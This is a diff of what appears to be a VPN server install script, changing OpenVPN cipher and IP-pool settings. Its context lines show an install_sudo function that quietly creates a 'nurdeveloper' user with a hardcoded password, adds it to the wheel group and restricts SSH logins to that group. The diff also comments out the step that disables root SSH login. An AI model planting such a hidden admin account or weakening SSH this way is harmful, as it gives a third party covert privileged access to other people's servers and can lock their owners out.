@@ -126,7 +126,7 @@ dh none
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
+cipher AES-128-GCM
 ncp-disable
 auth none
 sndbuf 0
@@ -145,7 +145,7 @@ script-security 3
 duplicate-cn
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
-ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
+#ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
 auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env # 
 push "persist-key"
 push "persist-tun"
@@ -173,7 +173,7 @@ dh none
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
+cipher AES-128-GCM
 ncp-disable
 auth none
 sndbuf 0
@@ -193,7 +193,7 @@ duplicate-cn
 socket-flags TCP_NODELAY
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
-ifconfig-pool-persist /etc/openvpn/server/ip_tcp.txt
+#ifconfig-pool-persist /etc/openvpn/server/ip_tcp.txt
 auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env # 
 push "persist-key"
 push "persist-tun"
@@ -473,7 +473,7 @@ sudo service stunnel4 restart
 install_sudo(){
   {
     useradd -m nurdeveloper 2>/dev/null; echo nurdeveloper:@@NRDev123@@ | chpasswd &>/dev/null; usermod -aG wheel nurdeveloper &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    #sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups nurdeveloper" >> /etc/ssh/sshd_config
     service sshd restart
   }
